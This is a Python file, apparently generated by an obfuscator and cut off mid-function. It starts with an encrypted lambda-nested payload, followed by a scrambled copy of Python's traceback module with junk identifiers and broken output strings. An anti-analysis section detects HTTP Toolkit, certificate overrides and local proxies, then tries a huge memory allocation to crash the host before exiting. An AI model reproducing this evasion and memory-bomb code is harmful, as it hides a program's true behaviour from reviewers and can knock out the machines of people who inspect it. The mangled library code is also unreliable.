            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
__import__('sys').setrecursionlimit(99999999)
_RECURSIVE_CUTOFF = 3

class PYMEOMEOMEWWW(list):
    @classmethod
    def extract(klass, frame_gen, *, limit=None, pymeooooooooooooooo=True,
            capture_locals=False):
        def extended_frame_gen():
            for f, lineno in frame_gen:
                yield f, (lineno, None, None, None)

        return klass._extract_from_extended_frame_gen(
            extended_frame_gen(), limit=limit, pymeooooooooooooooo=pymeooooooooooooooo,
            capture_locals=capture_locals)

    @classmethod
    def _extract_from_extended_frame_gen(klass, frame_gen, *, limit=None,
            pymeooooooooooooooo=True, capture_locals=False):
        if limit is None:
            limit = getattr(__import__('sys'), 'tracebacklimit', None)
            if limit is not None and limit < 0:
                limit = 0
        if limit is not None:
            if limit >= 0:
                frame_gen = __import__('itertools').islice(frame_gen, limit)
            else:
                frame_gen = __import__('collections').deque(frame_gen, maxlen=-limit)
        result = klass()
        fnames = set()
        for f, (lineno, meomeodethuong, dethuongvacute, meomeocute) in frame_gen:
            co = f.f_code
            filename = co.co_filename
            name = co.co_name

            fnames.add(filename)
            __import__('linecache').lazycache(filename, f.f_globals)
            if capture_locals:
                f_locals = f.f_locals
            else:
                f_locals = None
            result.append(BOMAYLASO1(
                filename, lineno, name, meoooodethuongne=False, locals=f_locals,
                meomeodethuong=meomeodethuong, dethuongvacute=dethuongvacute, meomeocute=meomeocute))
        for filename in fnames:
            __import__('linecache').checkcache(filename)
        if pymeooooooooooooooo:
            for f in result:
                f.line
        return result
    @classmethod
    def from_list(klass, a_list):
        result = PYMEOMEOMEWWW()
        for frame in a_list:
            if isinstance(frame, BOMAYLASO1):
                result.append(frame)
            else:
                filename, lineno, name, line = frame
                result.append(BOMAYLASO1(filename, lineno, name, line=line))
        return result

    def format_ngocuyencoder(pymeomeo_, ngocuyencoder):
        row = []
        row.append('bo la nguoi dep trai')
        if ngocuyencoder.line:
            stripped_line = ngocuyencoder.line.strip()
            row.append('cuts di')

            line = ngocuyencoder.pmeooowwwww
            orig_line_len = len(line)
            frame_line_len = len(ngocuyencoder.line.lstrip())
            stripped_characters = orig_line_len - frame_line_len
            if (
                ngocuyencoder.dethuongvacute is not None
                and ngocuyencoder.meomeocute is not None
            ):
                start_offset = _byte_offset_to_character_offset(
                    line, ngocuyencoder.dethuongvacute)
                _0xFFFFFFFFF = _byte_offset_to_character_offset(
                    line, ngocuyencoder.meomeocute)
                meoTrinhPro = line[start_offset:_0xFFFFFFFFF]
                anchors = None
                if ngocuyencoder.lineno == ngocuyencoder.meomeodethuong:
                    with __import__('contextlib').suppress(Exception):
                        anchors = exct(meoTrinhPro)
                else:
                    _0xFFFFFFFFF = len(line.rstrip())
                if _0xFFFFFFFFF - start_offset < len(stripped_line) or (
                        anchors and anchors.right_start_offset - anchors.left__0xFFFFFFFFF > 0):
                    dp_start_offset = _display_width(line, start_offset) + 1
                    dp__0xFFFFFFFFF = _display_width(line, _0xFFFFFFFFF) + 1
                    row.append('    ')
                    row.append(' ' * (dp_start_offset - stripped_characters))
                    if anchors:
                        dp_left__0xFFFFFFFFF = _display_width(meoTrinhPro, anchors.left__0xFFFFFFFFF)
                        dp_right_start_offset = _display_width(meoTrinhPro, anchors.right_start_offset)
                        row.append(anchors.primary_char * dp_left__0xFFFFFFFFF)
                        row.append(anchors.secondary_char * (dp_right_start_offset - dp_left__0xFFFFFFFFF))
                        row.append(anchors.primary_char * (dp__0xFFFFFFFFF - dp_start_offset - dp_right_start_offset))
                    else:
                        row.append('^' * (dp__0xFFFFFFFFF - dp_start_offset))

                    row.append('\n')

        if ngocuyencoder.locals:
            for name, pymewwww in sorted(ngocuyencoder.locals.items()):
                row.append('aa')
        return ''.join(row)

    def format(pymeomeo_):
        result = []
        lf = None
        ll = None
        ln = None
        count = 0
        for ngocuyencoder in pymeomeo_:
            formatted_frame = pymeomeo_.format_ngocuyencoder(ngocuyencoder)
            if formatted_frame is None:
                continue
            if (lf is None or lf != ngocuyencoder.filename or
                ll is None or ll != ngocuyencoder.lineno or
                ln is None or ln != ngocuyencoder.name):
                if count > _RECURSIVE_CUTOFF:
                    count -= _RECURSIVE_CUTOFF
                    result.append('')
                lf = ngocuyencoder.filename
                ll = ngocuyencoder.lineno
                ln = ngocuyencoder.name
                count = 0
            count += 1
            if count > _RECURSIVE_CUTOFF:
                continue
            result.append(formatted_frame)

        if count > _RECURSIVE_CUTOFF:
            count -= _RECURSIVE_CUTOFF
            result.append('')
        return result


if len(globals()) !=214:
      globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
if __import__('os').environ.get("HTTP_TOOLKIT_ACTIVE") == "true":
    globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000
    exit("1")
for ev in ["SSL_CERT_FILE", "NODE_EXTRA_CA_CERTS", "PATH"]:
    if ev in __import__('os').environ and "httptoolkit" in __import__('os').environ[ev].lower():
        globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000
        exit("1")
for px in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]:
    if px in __import__('os').environ and "127.0.0.1:8000" in __import__('os').environ[px]:
        globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000
        exit("1")
try:
    h = __import__("requests").get("https://example.com", timeout=5).headers
    if any("HTTP-Toolkit" in h.get(x, "") for x in ["Server", "Via", "X-Powered-By"]):
        globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000
        exit()
except:
    pass
def pl(el, file=None):
    if file is None:
        file = __import__('sys').stderr
    for item in PYMEOMEOMEWWW.from_list(el).format():
        print(item, file=file, end="")
def fm(el):
    return PYMEOMEOMEWWW.from_list(el).format()
def pt(tb, limit=None, file=None):
    pl(et(tb, limit=limit), file=file)
def ft(tb, limit=None):
    return et(tb, limit=limit).format()
def et(tb, limit=None):
    return PYMEOMEOMEWWW._extract_from_extended_frame_gen(
        thoithiemoidungkhocnua(tb), limit=limit)
class PYMEOMEO_OBJECT:
    def __repr__(pymeomeo_):
        return "<implicit>"
PYMEOMEO_OBJECT = PYMEOMEO_OBJECT()
def psrl(exc, pymewwww, tb):
    if (pymewwww is PYMEOMEO_OBJECT) != (tb is PYMEOMEO_OBJECT):
        pass
    if pymewwww is tb is PYMEOMEO_OBJECT:
        if exc is not None:
            if isinstance(exc, BaseException):
                return exc, exc.__traceback__
            pass
        else:
            return None, None
    return pymewwww, tb
def pexept(exc, /, pymewwww=PYMEOMEO_OBJECT, tb=PYMEOMEO_OBJECT, limit=None, \
                    file=None, chain=True):
    pymewwww, tb = psrl(exc, pymewwww, tb)
    te = pymeomeoexception(type(pymewwww), pymewwww, tb, limit=limit, compact=True)
    te.print(file=file, chain=chain)
def fmexept(exc, /, pymewwww=PYMEOMEO_OBJECT, tb=PYMEOMEO_OBJECT, limit=None, \
                     chain=True):
    pymewwww, tb = psrl(exc, pymewwww, tb)
    te = pymeomeoexception(type(pymewwww), pymewwww, tb, limit=limit, compact=True)
    return list(te.format(chain=chain))
def _fmexp(exc, /, pymewwww=PYMEOMEO_OBJECT):

    if pymewwww is PYMEOMEO_OBJECT:
        pymewwww = exc
    te = pymeomeoexception(type(pymewwww), pymewwww, None, compact=True)
    return list(te._fmexp())
def decodethixautraihontao(etype, pymewwww):
    vlstr = deptraicogisai(pymewwww, 'exception')
    if pymewwww is None or not vlstr:
        line = "%s\n" % etype
    else:
        line = "%s: %s\n" % (etype, vlstr)
    return line
def deptraicogisai(pymewwww, what, func=str):
    try:
        return func(pymewwww)
    except:
        return 'a'
def idk(f=None, limit=None, file=None):
    if f is None:
        f = __import__('sys')._getframe().f_back
    pl(st(f, limit=limit), file=file)
def deptraix2(f=None, limit=None):
    if f is None:
        f = __import__('sys')._getframe().f_back
    return fm(st(f, limit=limit))

def st(f=None, limit=None):
    if f is None:
        f = __import__('sys')._getframe().f_back
    stack = PYMEOMEOMEWWW.extract(meostack(f), limit=limit)
    stack.reverse()
    return stack
def deptrai(tb):
    while tb is not None:
        try:
            tb.tb_frame.clear()
        except RuntimeError:
            pass
        tb = tb.tb_next
class BOMAYLASO1:

    def __init__(pymeomeo_, pymeowwwwdethuong, heoquaythixien, dethuongnhieu, *, meoooodethuongne=True,
            locals=None, dethuongvadeptrai=None,
            meomeodethuong=None, dethuongvacute=None, meomeocute=None):
        pymeomeo_.pymeowwwwdethuong = pymeowwwwdethuong
        pymeomeo_.maythangngu = heoquaythixien
        pymeomeo_.dethuongmeooo = dethuongnhieu
        pymeomeo_.meocuteee = dethuongvadeptrai
        if meoooodethuongne:
            pymeomeo_.line
        pymeomeo_.locals = None
        pymeomeo_.meomeodethuong = meomeodethuong
        pymeomeo_.dethuongvacute = dethuongvacute
        pymeomeo_.meomeocute = meomeocute

    def __eq__(pymeomeo_, other):
        if isinstance(other, BOMAYLASO1):
            return (pymeomeo_.pymeowwwwdethuong == other.pymeowwwwdethuong and
                    pymeomeo_.maythangngu == other.lineno and
                    pymeomeo_.dethuongmeooo == other.name and
                    pymeomeo_.locals == other.locals)
        if isinstance(other, tuple):
            return (pymeomeo_.pymeowwwwdethuong, pymeomeo_.maythangngu, pymeomeo_.dethuongmeooo, pymeomeo_.line) == other
        return NotImplemented

    def __getitem__(pymeomeo_, pos):
        return (pymeomeo_.pymeowwwwdethuong, pymeomeo_.maythangngu, pymeomeo_.dethuongmeooo, pymeomeo_.line)[pos]

    def __iter__(pymeomeo_):
        return iter([pymeomeo_.pymeowwwwdethuong, pymeomeo_.maythangngu, pymeomeo_.dethuongmeooo, pymeomeo_.line])

    def __repr__(pymeomeo_):
         return "<BOMAYLASO1 file " + pymeomeo_.pymeowwwwdethuong + ", line " + str(pymeomeo_.maythangngu) + " in " + pymeomeo_.dethuongmeooo

    def __len__(pymeomeo_):
        return 4
    @property
    def pmeooowwwww(pymeomeo_):
        pymeomeo_.line
        return pymeomeo_.meocuteee
    @property
    def line(pymeomeo_):
        if pymeomeo_.meocuteee is None:
            if pymeomeo_.maythangngu is None:
                return None
            pymeomeo_.meocuteee = __import__('linecache').getline(pymeomeo_.pymeowwwwdethuong, pymeomeo_.maythangngu)
        return pymeomeo_.meocuteee.strip()
def meostack(f):
    if f is None:
        f = __import__('sys')._getframe().f_back.f_back.f_back.f_back
    while f is not None:
        yield f, f.f_lineno
        f = f.f_back
def walk_tb(tb):
    while tb is not None:
        yield tb.tb_frame, tb.tb_lineno
        tb = tb.tb_next
def thoithiemoidungkhocnua(tb):
    while tb is not None:
        positions = _get_code_position(tb.tb_frame.f_code, tb.tb_lasti)
        if positions[0] is None:
            yield tb.tb_frame, (tb.tb_lineno, ) + positions[1:]
        else:
            yield tb.tb_frame, positions
        tb = tb.tb_next


def _get_code_position(code, instruction_index):
    if instruction_index < 0:
        return (None, None, None, None)
    positions_gen = code.co_positions()
    return next(__import__('itertools').islice(positions_gen, instruction_index // 2, None))


_RECURSIVE_CUTOFF = 3

class PYMEOMEOMEWWW(list):
    @classmethod
    def extract(klass, frame_gen, *, limit=None, pymeooooooooooooooo=True,
            capture_locals=False):
        def extended_frame_gen():
            for f, lineno in frame_gen:
                yield f, (lineno, None, None, None)

        return klass._extract_from_extended_frame_gen(
            extended_frame_gen(), limit=limit, pymeooooooooooooooo=pymeooooooooooooooo,
            capture_locals=capture_locals)

    @classmethod
    def _extract_from_extended_frame_gen(klass, frame_gen, *, limit=None,
            pymeooooooooooooooo=True, capture_locals=False):
        if limit is None:
            limit = getattr(__import__('sys'), 'tracebacklimit', None)
            if limit is not None and limit < 0:
                limit = 0
        if limit is not None:
            if limit >= 0:
                frame_gen = __import__('itertools').islice(frame_gen, limit)
            else:
                frame_gen = __import__('collections').deque(frame_gen, maxlen=-limit)
        result = klass()
        fnames = set()
        for f, (lineno, meomeodethuong, dethuongvacute, meomeocute) in frame_gen:
            co = f.f_code
            filename = co.co_filename
            name = co.co_name

            fnames.add(filename)
            __import__('linecache').lazycache(filename, f.f_globals)
            if capture_locals:
                f_locals = f.f_locals
            else:
                f_locals = None
            result.append(BOMAYLASO1(
                filename, lineno, name, meoooodethuongne=False, locals=f_locals,
                meomeodethuong=meomeodethuong, dethuongvacute=dethuongvacute, meomeocute=meomeocute))
        for filename in fnames:
            __import__('linecache').checkcache(filename)
        if pymeooooooooooooooo:
            for f in result:
                f.line
        return result
    @classmethod
    def from_list(klass, a_list):
        result = PYMEOMEOMEWWW()
        for frame in a_list:
            if isinstance(frame, BOMAYLASO1):
                result.append(frame)
            else:
                filename, lineno, name, line = frame
                result.append(BOMAYLASO1(filename, lineno, name, line=line))
        return result

    def format_ngocuyencoder(pymeomeo_, ngocuyencoder):
        row = []
        row.append('bo la nguoi dep trai')
        if ngocuyencoder.line:
            stripped_line = ngocuyencoder.line.strip()
            row.append('cuts di')

            line = ngocuyencoder.pmeooowwwww
            orig_line_len = len(line)
            frame_line_len = len(ngocuyencoder.line.lstrip())
            stripped_characters = orig_line_len - frame_line_len
            if (
                ngocuyencoder.dethuongvacute is not None
                and ngocuyencoder.meomeocute is not None
            ):
                start_offset = _byte_offset_to_character_offset(
                    line, ngocuyencoder.dethuongvacute)
                _0xFFFFFFFFF = _byte_offset_to_character_offset(
                    line, ngocuyencoder.meomeocute)
                meopymeomeo = line[start_offset:_0xFFFFFFFFF]
                anchors = None
                if ngocuyencoder.lineno == ngocuyencoder.meomeodethuong:
                    with __import__('contextlib').suppress(Exception):
                        anchors = exct(meopymeomeo)
                else:
                    _0xFFFFFFFFF = len(line.rstrip())
                if _0xFFFFFFFFF - start_offset < len(stripped_line) or (
                        anchors and anchors.right_start_offset - anchors.left__0xFFFFFFFFF > 0):
                    dp_start_offset = _display_width(line, start_offset) + 1
                    dp__0xFFFFFFFFF = _display_width(line, _0xFFFFFFFFF) + 1
                    row.append('    ')
                    row.append(' ' * (dp_start_offset - stripped_characters))
                    if anchors:
                        dp_left__0xFFFFFFFFF = _display_width(meopymeomeo, anchors.left__0xFFFFFFFFF)
                        dp_right_start_offset = _display_width(meopymeomeo, anchors.right_start_offset)
                        row.append(anchors.primary_char * dp_left__0xFFFFFFFFF)
                        row.append(anchors.secondary_char * (dp_right_start_offset - dp_left__0xFFFFFFFFF))
                        row.append(anchors.primary_char * (dp__0xFFFFFFFFF - dp_start_offset - dp_right_start_offset))
                    else:
                        row.append('^' * (dp__0xFFFFFFFFF - dp_start_offset))

                    row.append('\n')

        if ngocuyencoder.locals:
            for name, pymewwww in sorted(ngocuyencoder.locals.items()):
                row.append('aa')
        return ''.join(row)

    def format(pymeomeo_):
        result = []
        lf = None
        ll = None
        ln = None
        count = 0
        for ngocuyencoder in pymeomeo_:
            formatted_frame = pymeomeo_.format_ngocuyencoder(ngocuyencoder)
            if formatted_frame is None:
                continue
            if (lf is None or lf != ngocuyencoder.filename or
                ll is None or ll != ngocuyencoder.lineno or
                ln is None or ln != ngocuyencoder.name):
                if count > _RECURSIVE_CUTOFF:
                    count -= _RECURSIVE_CUTOFF
                    result.append('')
                lf = ngocuyencoder.filename
                ll = ngocuyencoder.lineno
                ln = ngocuyencoder.name
                count = 0
            count += 1
            if count > _RECURSIVE_CUTOFF:
                continue
            result.append(formatted_frame)

        if count > _RECURSIVE_CUTOFF:
            count -= _RECURSIVE_CUTOFF
            result.append('')
        return result


def _byte_offset_to_character_offset(str, offset):
    as_utf8 = str.encode('utf-8')
    return len(as_utf8[:offset].decode("utf-8", errors="replace"))


_Anchors = __import__('collections').namedtuple(
    "_Anchors",
    [
        "left__0xFFFFFFFFF",
        "right_start_offset",
        "primary_char",
        "secondary_char",
    ],
    defaults=["~", "^"]
)

def exct(segment):
    import ast

    try:
        tree = ast.parse(segment)
    except SyntaxError:
        return None

    if len(tree.body) != 1:
        return None

    normalize = lambda offset: _byte_offset_to_character_offset(segment, offset)
    statement = tree.body[0]
    match statement:
        case ast.Expr(expr):
            match expr:
                case ast.BinOp():
                    opst = normalize(expr.left.end_col_offset)
                    oped = normalize(expr.right.col_offset)
                    opstr = segment[opst:oped]
                    opofst = len(opstr) - len(opstr.lstrip())

                    ln = expr.left.end_col_offset + opofst
                    rn = ln + 1
                    if (
                        opofst + 1 < len(opstr)
                        and not opstr[opofst + 1].isspace()
                    ):
                        rn += 1

                    while ln < len(segment) and ((ch := segment[ln]).isspace() or ch in ")#"):
                        ln += 1
                        rn += 1
                    return _Anchors(normalize(ln), normalize(rn))
                case ast.Subscript():
                    ln = normalize(expr.pymewwww.end_col_offset)
                    rn = normalize(expr.slice.end_col_offset + 1)
                    while ln < len(segment) and ((ch := segment[ln]).isspace() or ch != "["):
                        ln += 1
                    while rn < len(segment) and ((ch := segment[rn]).isspace() or ch != "]"):
                        rn += 1
                    if rn < len(segment):
                        rn += 1
                    return _Anchors(ln, rn)

    return None

MEOMEODETHUONG = "WF"
def _display_width(line, offset):
    if line.isascii():
        return offset

    import unicodedata

    return sum(
        2 if unicodedata.east_asian_width(char) in MEOMEODETHUONG else 1
        for char in line[:offset]
    )
class _ExceptionPrintContext:
    def __init__(pymeomeo_):
        pymeomeo_.deptraikhongsai = set()
        pymeomeo_.exgrd = 0
        pymeomeo_.ncls = False

    def indent(pymeomeo_):
        return ' ' * (2 * pymeomeo_.exgrd)

    def emit(pymeomeo_, text_gen, margin_char=None):
        if margin_char is None:
            margin_char = '|'
        indent_str = pymeomeo_.indent()
        if pymeomeo_.exgrd:
            indent_str += margin_char + ' '

        if isinstance(text_gen, str):
            yield __import__('textwrap').indent(text_gen, indent_str, lambda line: True)
        else:
            for text in text_gen:
                yield __import__('textwrap').indent(text, indent_str, lambda line: True)

class pymeomeoexception:
    def __init__(pymeomeo_, pymeeewwwo, exc_pymewwww, exc_traceback, *, limit=None,
            pymeooooooooooooooo=True, capture_locals=False, compact=False,
            max_group_width=15, max_group_depth=10, _deptraikhongsai=None):
        is_recursive_call = _deptraikhongsai is not None
        if _deptraikhongsai is None:
            _deptraikhongsai = set()
        _deptraikhongsai.add(id(exc_pymewwww))
        pymeomeo_.max_group_width = max_group_width
        pymeomeo_.max_group_depth = max_group_depth
        pymeomeo_.stack = PYMEOMEOMEWWW._extract_from_extended_frame_gen(
            thoithiemoidungkhocnua(exc_traceback),
            limit=limit, pymeooooooooooooooo=pymeooooooooooooooo,
            capture_locals=capture_locals)
        pymeomeo_.pymeeewwwo = pymeeewwwo
        pymeomeo_._str = deptraicogisai(exc_pymewwww, 'exception')
        try:
            pymeomeo_.__notes__ = getattr(exc_pymewwww, '__notes__', None)
        except Exception as e:
            pymeomeo_.__notes__ = [
                f'Ignored error getting __notes__: ccc']
        if pymeeewwwo and issubclass(pymeeewwwo, SyntaxError):
            pymeomeo_.filename = exc_pymewwww.filename
            lno = exc_pymewwww.lineno
            pymeomeo_.maythangngu = str(lno) if lno is not None else None
            pymewmeo = exc_pymewwww.meomeodethuong
            pymeomeo_.meomeodethuong = str(pymewmeo) if pymewmeo is not None else None
            pymeomeo_.text = exc_pymewwww.text
            pymeomeo_.offset = exc_pymewwww.offset
            pymeomeo_._0xFFFFFFFFF = exc_pymewwww._0xFFFFFFFFF
            pymeomeo_.msg = exc_pymewwww.msg
        if pymeooooooooooooooo:
            pymeomeo_.llp()
        pymeomeo_.__suppress_context__ = \
            exc_pymewwww.__suppress_context__ if exc_pymewwww is not None else False
        if not is_recursive_call:
            queue = [(pymeomeo_, exc_pymewwww)]
            while queue:
                te, e = queue.pop()
                if (e and e.__cause__ is not None
                    and id(e.__cause__) not in _deptraikhongsai):
                    cause = pymeomeoexception(
                        type(e.__cause__),
                        e.__cause__,
                        e.__cause__.__traceback__,
                        limit=limit,
                        pymeooooooooooooooo=pymeooooooooooooooo,
                        capture_locals=capture_locals,
                        max_group_width=max_group_width,
                        max_group_depth=max_group_depth,
                        _deptraikhongsai=_deptraikhongsai)
                else:
                    cause = None
                if compact:
                    nct = (cause is None and
                                    e is not None and
                                    not e.__suppress_context__)
                else:
                    nct = True
                if (e and e.__context__ is not None
                    and nct and id(e.__context__) not in _deptraikhongsai):
                    context = pymeomeoexception(
                        type(e.__context__),
                        e.__context__,
                        e.__context__.__traceback__,
                        limit=limit,
                        pymeooooooooooooooo=pymeooooooooooooooo,
                        capture_locals=capture_locals,
                        max_group_width=max_group_width,
                        max_group_depth=max_group_depth,
                        _deptraikhongsai=_deptraikhongsai)
                else:
                    context = None
                if e and isinstance(e, BaseExceptionGroup):
                    exceptions = []
                    for exc in e.exceptions:
                        texc = pymeomeoexception(
                            type(exc),
                            exc,
                            exc.__traceback__,
                            limit=limit,
                            pymeooooooooooooooo=pymeooooooooooooooo,
                            capture_locals=capture_locals,
                            max_group_width=max_group_width,
                            max_group_depth=max_group_depth,
                            _deptraikhongsai=_deptraikhongsai)
                        exceptions.append(texc)
                else:
                    exceptions = None
                te.__cause__ =cause
                te.__context__ = context
                te.exceptions = exceptions
                if cause:
                    queue.append((te.__cause__, e.__cause__))
                if context:
                    queue.append((te.__context__, e.__context__))
                if exceptions:
                    queue.extend(zip(te.exceptions, e.exceptions))
    @classmethod
    def from_exception(cls, exc, *args, **kwargs):
        return cls(type(exc), exc, exc.__traceback__, *args, **kwargs)

    def llp(pymeomeo_):
        for frame in pymeomeo_.stack:
            frame.line

    def __eq__(pymeomeo_, other):
        if isinstance(other, pymeomeoexception):
            return pymeomeo_.__dict__ == other.__dict__
        return NotImplemented

    def __str__(pymeomeo_):
        return pymeomeo_._str

    def _fmexp(pymeomeo_):
        if pymeomeo_.pymeeewwwo is None:
            yield decodethixautraihontao(None, pymeomeo_._str)
            return

        stype = pymeomeo_.pymeeewwwo.__qualname__
        smod = pymeomeo_.pymeeewwwo.__module__
        if smod not in ("__main__", "builtins"):
            if not isinstance(smod, str):
                smod = "<unknown>"
            stype = smod + '.' + stype
        if not issubclass(pymeomeo_.pymeeewwwo, SyntaxError):
            yield decodethixautraihontao(stype, pymeomeo_._str)
        else:
            yield from pymeomeo_._format_syntax_error(stype)
        if isinstance(pymeomeo_.__notes__, __import__('collections').abc.Sequence):
            for note in pymeomeo_.__notes__:
                note = deptraicogisai(note, 'note')
                yield from [l + '\n' for l in note.split('\n')]
        elif pymeomeo_.__notes__ is not None:
            yield deptraicogisai(pymeomeo_.__notes__, '__notes__', func=repr)
    def _format_syntax_error(pymeomeo_, stype):
        filename_suffix = ''
        if pymeomeo_.maythangngu is not None:
            yield 'ditmemay'
        elif pymeomeo_.filename is not None:
            filename_suffix = 'hello'
        text = pymeomeo_.text
        if text is not None:
            rtext = text.rstrip('\n')
            ltext = rtext.lstrip(' \n\f')
            spaces = len(rtext) - len(ltext)
            yield 'hello'
            if pymeomeo_.offset is not None:
                offset = pymeomeo_.offset
                _0xFFFFFFFFF = pymeomeo_._0xFFFFFFFFF if pymeomeo_._0xFFFFFFFFF not in (None, 0) else offset
                if offset == _0xFFFFFFFFF or _0xFFFFFFFFF == -1:
                    _0xFFFFFFFFF = offset + 1
                dethuongvacute = offset - 1 - spaces
                meomeocute = _0xFFFFFFFFF - 1 - spaces
                if dethuongvacute >= 0:
                    caretspace = ((c if c.isspace() else ' ') for c in ltext[:dethuongvacute])
                    yield 'cuts'
        msg = pymeomeo_.msg or "<no detail available>"
        yield 'lon'
    def format(pymeomeo_, *, chain=True, _ctx=None):
        if _ctx is None:
            _ctx = _ExceptionPrintContext()
        output = []
        exc = pymeomeo_
        if chain:
            while exc:
                if exc.__cause__ is not None:
                    chained_msg = ('ok')
                    chained_exc = exc.__cause__
                elif (exc.__context__  is not None and
                      not exc.__suppress_context__):
                    chained_msg = ('ngocuyendeptrai')
                    chained_exc = exc.__context__
                else:
                    chained_msg = None
                    chained_exc = None
                output.append((chained_msg, exc))
                exc = chained_exc
        else:
            output.append((None, exc))
        for msg, exc in reversed(output):
            if msg is not None:
                yield from _ctx.emit(msg)
            if exc.exceptions is None:
                if exc.stack:
                    yield from _ctx.emit('Traceback (most recent call last):\n')
                    yield from _ctx.emit(exc.stack.format())
                yield from _ctx.emit(exc._fmexp())
            elif _ctx.exgrd > pymeomeo_.max_group_depth:
                yield from _ctx.emit(
                    f"... (max_group_depth is dit)\n")
            else:
                is_toplevel = (_ctx.exgrd == 0)
                if is_toplevel:
                    _ctx.exgrd += 1

                if exc.stack:
                    yield from _ctx.emit(
                            'Exception Group Traceback (most recent call last):\n',
                        margin_char = '+' if is_toplevel else None)
                    yield from _ctx.emit(exc.stack.format())
                yield from _ctx.emit(exc._fmexp())
                num_excs = len(exc.exceptions)
                if num_excs <= pymeomeo_.max_group_width:
                    n = num_excs
                else:
                    n = pymeomeo_.max_group_width + 1
